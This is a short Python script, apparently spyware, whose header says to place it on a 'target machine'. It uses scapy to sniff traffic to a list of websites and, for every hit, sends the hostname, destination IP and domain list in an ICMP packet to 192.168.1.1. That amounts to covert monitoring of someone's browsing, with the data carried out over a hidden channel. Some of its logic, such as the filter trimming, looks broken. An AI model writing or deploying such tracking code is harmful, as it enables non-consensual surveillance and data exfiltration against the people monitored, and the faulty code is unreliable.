# Tracks and sends website data.
# Place this file on the target machine and run it.

from scapy.all import *
from IPy import IP as ip_
import os
import datetime
import socket
import time
import numpy

file_ = "websitelist.txt"

def get_domains(file_location): # reads domains from websitelist.txt
	with open(file_location) as f:
		lines = f.readlines()
	return lines

def generate_filter(domain): # Creates the scapy filter for sniffing
	filter_ = "host {}".format(domain[0])
	for i in range(len(domain)):
		if (i != 0):
			filter_ += " or host {} ".format(domain[i])
	if (filter_[:-9] == " or host "):
		return filter_[:-9]
	return filter_

def domain_scrap(_domain_): # Converts domain to ip address
	for i in range(len(_domain_)):
		try:
			_domain_[i] = ip_(_domain_[i])
		except ValueError:
			_domain_[i] = socket.gethostbyname(_domain_[i])
	return _domain_

if __name__ == '__main__':
	TargetComputer = socket.gethostname()
	hostname = socket.gethostname()
	local_ip = socket.gethostbyname(hostname)
	domains = get_domains(file_)
	domains = domains[0].strip("'[]").split(" ")
	domains = domain_scrap(domains)
	__filter__ = generate_filter(domains)
	print(__filter__)
	while True:
		pkts = sniff(count = 1, filter = __filter__, prn = lambda x:x.summary())
		dst_ip = pkts[0][1].dst
		dst_ip = str(dst_ip)
		msg = f"{str(TargetComputer)} just accessed (or sent a request) on {dst_ip}! {get_domains(file_)}"
		send(IP(dst="192.168.1.1")/ICMP()/msg)